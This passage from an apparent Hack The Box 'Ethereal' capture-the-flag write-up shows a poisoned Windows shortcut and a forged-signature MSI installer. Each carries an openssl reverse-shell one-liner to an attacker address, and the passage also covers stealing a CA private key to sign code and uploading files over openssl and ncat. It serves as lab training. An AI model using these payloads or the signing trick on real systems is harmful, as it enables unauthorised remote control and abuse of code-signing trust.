07/03/2018  09:25 PM    <DIR>          Downloads
07/16/2016  01:23 PM    <DIR>          Libraries
07/16/2016  01:23 PM    <DIR>          Music
07/16/2016  01:23 PM    <DIR>          Pictures
07/16/2016  01:23 PM    <DIR>          Videos
               1 File(s)            174 bytes
              10 Dir(s)  15,428,009,984 bytes free

```

On that desktop, in a folder called `Shortcuts`, there’s a lnk file:

```

c:\Users\Public\Desktop\Shortcuts>dir
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of c:\Users\Public\Desktop\Shortcuts

07/17/2018  08:15 PM    <DIR>          .
07/17/2018  08:15 PM    <DIR>          ..
07/06/2018  02:28 PM             6,125 Visual Studio 2017.lnk
               1 File(s)          6,125 bytes
               2 Dir(s)  15,427,989,504 bytes free

```

I’ll also note that the `Shortcuts` dir is one of the few places on this host that I can write, including the `lnk` file:

```

c:\Users\Public\Desktop>icacls shortcuts
shortcuts Everyone:(DENY)(D,WDAC,WO)
          NT AUTHORITY\SYSTEM:(OI)(CI)(F)
          ETHEREAL\rupal:(OI)(CI)(D,DC)
          ETHEREAL\Administrator:(OI)(CI)(D,DC)
          BUILTIN\Administrators:(OI)(CI)(F)
          CREATOR OWNER:(OI)(CI)(IO)(F)
          NT AUTHORITY\INTERACTIVE:(OI)(CI)(M,DC)
          NT AUTHORITY\SERVICE:(OI)(CI)(M,DC)
          NT AUTHORITY\BATCH:(OI)(CI)(M,DC)
          Everyone:(OI)(CI)(M)

Successfully processed 1 files; Failed processing 0 files

c:\Users\Public\Desktop\Shortcuts>icacls *.lnk
Visual Studio 2017.lnk NT AUTHORITY\SYSTEM:(I)(F)
                       ETHEREAL\rupal:(I)(D,DC)
                       ETHEREAL\Administrator:(I)(D,DC)
                       BUILTIN\Administrators:(I)(F)
                       ETHEREAL\jorge:(I)(F)
                       NT AUTHORITY\INTERACTIVE:(I)(M,DC)
                       NT AUTHORITY\SERVICE:(I)(M,DC)
                       NT AUTHORITY\BATCH:(I)(M,DC)
                       Everyone:(I)(M)

Successfully processed 1 files; Failed processing 0 files

```

### Visual Studio 2017.lnk

#### Exfil

I’m going to pull this file back and examine it more closely. I’ll use `openssl` to base64 encode the file:

```

c:\Users\Public\Desktop\Shortcuts>\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in "Visual Studio 2017.lnk"
TAAAAAEUAgAAAAAAwAAAAAAAAEaTAAgAIAAAAFq8iia2ENQBWryKJrYQ1AF4WDVG
thDUAWDWCgAAAAAAAQAAAAAAAAAAAAAAAAAAAIkTcQQfACEE1d+jIxMEBAAAAAAA
DwQAADFTUFMF1c3VnC4bEJOXCAArLPmuSwMAABIAAAAAQQB1AHQAbwBMAGkAcwB0
AAAAQgAAAB4AAABwAHIAbwBwADQAMgA5ADQAOQA2ADcAMgA5ADUAAAAAAAEDAACu
pU444a2KToqbe+p4//HpBgAAgAAAAAABAAAAAgAAgAEAAAABAAAAAgAAACAAAAAA
AAAAAQJVAB8ALwAQt6b1GQAvRDpcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAHQaWV6W39NIjWcXM7zuKLp3LPv1Lw4WSqOBPlYMaLyDegAxAAAA
...

```

Then I can copy and paste to my local machine, and decode with `base64 -d`.

#### Analysis

I showed how to user [pylinker](https://github.com/HarmJ0y/pylnker) in my writeup for [Access](/2019/03/02/htb-access.html#pylnker), and I’ll make use of it here as well:

```

root@kali# python /opt/pylnker/pylnker.py vs.lnk
out:  Lnk File: vs.lnk
Link Flags: HAS SHELLIDLIST | POINTS TO FILE/DIR | NO DESCRIPTION | NO RELATIVE PATH STRING | HAS WORKING DIRECTORY | NO CMD LINE ARGS | NO CUSTOM ICON
File Attributes: ARCHIVE
Create Time:   2018-06-30 17:06:01.730570
Access Time:   2018-06-30 17:06:01.730570
Modified Time: 2018-06-30 17:06:54.858047
Target length: 710240
Icon Index: 0
ShowWnd: SW_NORMAL
HotKey: 0
Target is on local volume
Volume Type: Fixed (Hard Disk)
Volume Serial: 54e537d1
Vol Label: Development
Base Path: D:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE\devenv.exe
(App Path:) Remaining Path: 
Working Dir: D:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE

```

There’s nothing particularly interesting about the file.

### Poison lnk File

#### Strategy

Given the note’s reference to everyone using this link, I’m going to replace it with something I want to run in the hopes that someone else will click on it. Since I still can’t get anything outbound except `openssl`, I’m going to modify the file to make the same double `openssl` shell connection that I have with alan. I’ll show two ways to do this.

#### Windows

I’ll move the lnk file to a Windows VM and right click on it and select properties. There I’ll edit the target:

![1542293991625](https://0xdfimages.gitlab.io/img/1542293991625.png)

When I bring this back to my Kali host, I’ll verify with `pylnker` that it looks like I want it:

```

root@kali# python /opt/pylnker/pylnker.py vs-mod.lnk 
out:  Lnk File: vs-mod.lnk
Link Flags: HAS SHELLIDLIST | POINTS TO FILE/DIR | NO DESCRIPTION | HAS RELATIVE PATH STRING | HAS WORKING DIRECTORY | HAS CMD LINE ARGS | NO CUSTOM ICON
File Attributes: ARCHIVE
Create Time:   2010-11-20 22:23:55.516901
Access Time:   2010-11-20 22:23:55.516901
Modified Time: 2010-11-20 22:23:55.532503
Target length: 345088
Icon Index: 0
ShowWnd: SW_NORMAL
HotKey: 0
Target is on local volume
Volume Type: Fixed (Hard Disk)
Volume Serial: f06e7663
Vol Label: 
Base Path: C:\Windows\System32\cmd.exe
(App Path:) Remaining Path: 
Relative Path: ..\..\..\Windows\System32\cmd.exe
Working Dir: D:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE
Command Line: /c c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136

```

#### LNKUp

[LNKUp](https://github.com/Plazmaz/LNKUp) is an lnk payload generator written in python. LNKUp is really designed to work with Responder to capture Net-NTLM, but I can use it to make the payload I want for this case. To create a similar lnk file to the one I did above, I’ll run the following:

```

root@kali# python /opt/LNKUp/generate.py --host localhost --type ntlm --out vs-mod.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136"

  ~==================================================~
##                                                    ##
##  /$$       /$$   /$$ /$$   /$$ /$$   /$$           ##
## | $$      | $$$ | $$| $$  /$$/| $$  | $$           ##
## | $$      | $$$$| $$| $$ /$$/ | $$  | $$  /$$$$$$  ##
## | $$      | $$ $$ $$| $$$$$/  | $$  | $$ /$$__  $$ ##
## | $$      | $$  $$$$| $$  $$  | $$  | $$| $$  \ $$ ##
## | $$      | $$\  $$$| $$\  $$ | $$  | $$| $$  | $$ ##
## | $$$$$$$$| $$ \  $$| $$ \  $$|  $$$$$$/| $$$$$$$/ ##
## |________/|__/  \__/|__/  \__/ \______/ | $$____/  ##
##                                         | $$       ##
##                                         | $$       ##
##                                         |__/       ##
  ~==================================================~

File saved to /media/sf_CTFs/hackthebox/ethereal-10.10.10.106/vs-mod2.lnk
Link created at vs-mod2.lnk with UNC path \\localhost\Share\36855.ico.

```

The `--host` and `--type` parameters are really just to get it to run. The important part is the `--execute`.

For some reason, `pylnker` can’t read anything from the file that is generated. Still, this file will work.

### Upload

Now I want to get the poisoned lnk file to target. I’ll kill the output connection I currently have on port 136. I can still issue commands to port 73, I just won’t see the output. Then I can serve the link file with `ncat`, and then use `openssl` to get upload the file. I’ll issue this command into the port 73 terminal:

```

c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136 > c:\users\public\desktop\shortcuts\lnk.lnk

```

I’ll serve the file with `ncat`, and I get a connection back on port 136 to get the file:

```

root@kali# ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem  -lvp 136 < vs-mod.lnk
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::136
Ncat: Listening on 0.0.0.0:136
Ncat: Connection from 10.10.10.106.
Ncat: Connection from 10.10.10.106:49674.

```

Now I’ll issue the command to copy the poison lnk to the expected name:

```

copy /Y lnk.lnk "Visual Studio 2017.lnk"

```

Then I’ll quickly kill both listeners and restart them with `openssl`.

### Shell

Within a few minutes, I have a shell as jorge, in two windows, just like with alan:

```

root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\jorge\Documents>whoami
ethereal\jorge

```

And from there, I can get `user.txt`:

```

C:\Users\jorge\Desktop>type user.txt
2b9a4ca0...

```

I can also see the script that is running as jorge to click on the lnk. It starts a loop over sleeping for 5 seconds (via `ping`, since there’s no good sleep function in cmd), then running the lnk file. Then it sleeps another 5 seconds, then replaced the link with a clean copy. It sleeps another 50 seconds, and then kills `devenv.exe`, so that when the clean lnk is there, there aren’t tons of processes running.

```

C:\Users\jorge\Documents>type open-program.bat
@echo off

:loop

echo opening program

PING localhost -n 5 >NUL

START /MIN "" cmd /c "C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk" && PING localhost -n 5 >NUL && copy /Y "C:\Users\jorge\Documents\Visual Studio 2017.lnk" "C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk" && PING localhost -n 50 >NUL && taskkill /F /IM devenv.exe

cls

GOTO loop

```

## Shell as rupal

### Enumeration

If I look at the drives on the host, I can see a new one:

```

C:\Users\jorge\Documents>fsutil fsinfo drives

Drives: C:\ D:\ 

```

Going into `D:\`, I’ll see a `D:\Certs` directory:

```

D:\Certs>dir
 Volume in drive D is Development
 Volume Serial Number is 54E5-37D1

 Directory of D:\Certs

07/07/2018  09:50 PM    <DIR>          .
07/07/2018  09:50 PM    <DIR>          ..
07/01/2018  09:26 PM               772 MyCA.cer
07/01/2018  09:26 PM             1,196 MyCA.pvk
               2 File(s)          1,968 bytes
               2 Dir(s)   8,437,514,240 bytes free

```

I’ll base64 encode these with the following two commands:

```

c:\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in d:\certs\myca.cer
c:\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in d:\certs\myca.pvk

```

Then I can copy each back to my host, and decode with `base64 -d`.

I also find `D:\DEV\MSIs`, and it contains a note:

```

D:\DEV\MSIs>dir
 Volume in drive D is Development
 Volume Serial Number is 54E5-37D1

 Directory of D:\DEV\MSIs

07/08/2018  10:09 PM    <DIR>          .
07/08/2018  10:09 PM    <DIR>          ..
07/18/2018  09:47 PM               133 note.txt
               1 File(s)            133 bytes
               2 Dir(s)   8,437,514,240 bytes free

D:\DEV\MSIs>type note.txt
Please drop MSIs that need testing into this folder - I will review regularly. Certs have been added to the store already.
- Rupal

```

So I’ll need to create a signed MSI and drop it into this folder for Rupal to run.

### Make Code Signing Cert

I’m going to use the Certificate Authority to produce a code signing certificate. [This](https://stackoverflow.com/questions/84847/how-do-i-create-a-self-signed-certificate-for-code-signing-on-windows) Stack Exchange post provides a good overview. I’ll need to install the [SDK for certificate signing](https://www.microsoft.com/en-us/download/confirmation.aspx?id=8279) on my Windows VM.

I’ll bring the cer and pvk to my Windows VM. There I’ll use `makecert.exe` to first create new pvk and cer, and then use those to make a pfx, which is the code signing certificate:

```

C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>makecert.exe -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic \Users\0xdf\Desktop\myca.cer -iv \Users\0xdf\Desktop\myca.pvk -sv \Users\0xdf\Desktop\MySPC.pvk \Users\0xdf\Desktop\MySPC.cer
Succeeded

C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>pvk2pfx.exe -pvk \Users\0xdf\De
sktop\MySPC.pvk -spc \Users\0xdf\Desktop\MySPC.cer -pfx \Users\0xdf\Desktop\MySP
C.pfx

```

### Create MSI

I used a tool called [EMCO MSI Package Builder](https://emcosoftware.com/msi-package-builder/download). While I typically shy away from GUI tools where command line will do, the MSI structure was complex enough that I found this easiest.

After installing, I created a new project, and set the name and manufacturer:

![1542333195033](https://0xdfimages.gitlab.io/img/1542333195033.png)

Then I added a “Custom Action”, and defined it to be the same double OpenSSL shell.

![1542333213437](https://0xdfimages.gitlab.io/img/1542333213437.png)

![1542333230127](https://0xdfimages.gitlab.io/img/1542333230127.png)

Now I will push finish to create the MSI file.

### Sign MSI

Now, I’ll use the tools from the MS SDK I installed to sign the binary:

```

C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>signtool.exe sign /v /f \Users\0xdf\Desktop\MySPC.pfx /tr "http://timestamp.digicert.com" /td sha256 /fd sha256 \Users\0xdf\Desktop\Ethereal\Ethereal.msi
The following certificate was selected:
    Issued to: My SPC
    Issued by: My CA
    Expires:   Sat Dec 31 15:59:59 2039
    SHA1 hash: 4AE112B8A498C3054308367DD04C80AA921B4BD4

Done Adding Additional Store
Successfully signed and timestamped: \Users\0xdf\Desktop\Ethereal\Ethereal.msi

Number of files successfully Signed: 1
Number of warnings: 0
Number of errors: 0

```

I can check this locally, but the signature will come back invalid:

```

C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>signtool.exe verify /pa \Users\0xdf\Desktop\Ethereal\Ethereal.msi
SignTool Error: A certificate chain processed, but terminated in a root
        certificate which is not trusted by the trust provider.

Number of errors: 1

```

If I add the CA cert to my root cert store by right-clicking and selecting “Install”, it will then verify:

![1542319234864](https://0xdfimages.gitlab.io/img/1542319234864.png)

```

C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>signtool.exe verify /pa \Users\0xdf\Desktop\Ethereal\Ethereal.msi
Successfully verified: \Users\0xdf\Desktop\Ethereal\Ethereal.msi

```

Now it’s signed:

![1542319389198](https://0xdfimages.gitlab.io/img/1542319389198.png)

### Transfer to Ethereal

I’ll kill the shell output again and use that to copy my MSI to target:

```

c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136 > c:\users\public\desktop\shortcuts\msi.msi

```

```

root@kali# ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem  -lvp 136 < Ethereal.msi                                                                                        
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::136
Ncat: Listening on 0.0.0.0:136
Ncat: Connection from 10.10.10.106.
Ncat: Connection from 10.10.10.106:49679.

```

### Shell

Then I’ll copy that file into the MSI directory, restart both `openssl` listeners, and wait. I get a shell as rupal:

```

root@kali# openssl s_server -quiet -key key.pem -cert cert.pem -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
ethereal\rupal

```

And rupal is actually an administrator, so I can get `root.txt`:

```

C:\Windows\system32>net user

User accounts for \\ETHEREAL
-------------------------------------------------------------------------------
Administrator            alan                     DefaultAccount
Guest                    jorge                    rupal
The command completed successfully.

C:\Users\rupal\Desktop>type root.txt
1cb6f1fc...

```

I can also see the script being used to launch MSI files:

```

C:\Users\rupal\Documents>type launcher.bat
@echo off

cd "C:\Users\rupal\Documents"

:loop

echo opening MSIs

PING localhost -n 300 >NUL

dir /B "D:\DEV\MSIs\*.msi" > "C:\Users\rupal\Documents\files.txt"

for /F "tokens=*" %%A in (files.txt) do move "D:\DEV\MSIs\%%A" "C:\Users\rupal\Documents\MSI Testing" && START "" "C:\Windows\System32\msiexec.exe" /i "C:\Users\rupal\Documents\MSI Testing\%%A" /norestart && PING localhost -n 15 >NUL && taskkill /F /IM msiexec.exe && del /F "C:\Users\rupal\Documents\MSI Testing\%%A"

del /F "C:\Users\rupal\Documents\files.txt"

cls

GOTO loop

```

It does the following loop:
- Sleep for 300 seconds (5 minutes).
- Create a list on rupal’s desktop of MSI files in `D:\DEV\MSI\`.
- Run a for loop over the values in that list. For each file:
  - Move to to a folder.
  - Use`msiexec.exe` to run it the file.
  - Sleep for 15 seconds
  - Kill `msiexec`
  - Delete the MSI file
- Once the loop completes, it deletes the list.

While I wasn’t able to verify the MSI as jorge, I can now as rupal to show that my binary was in fact trusted:

```

D:\Program Files (x86)\Windows Kits\10\bin\10.0.17134.0\x64>signtool verify /pa c:\users\public\desktop\shortcuts\msi.msi
File: c:\users\public\desktop\shortcuts\msi.msi
Index  Algorithm  Timestamp    
========================================
0      sha256     RFC3161      

Successfully verified: c:\users\public\desktop\shortcuts\msi.msi

```

[Password Box Brute »](/2019/03/09/htb-ethereal-pbox.html)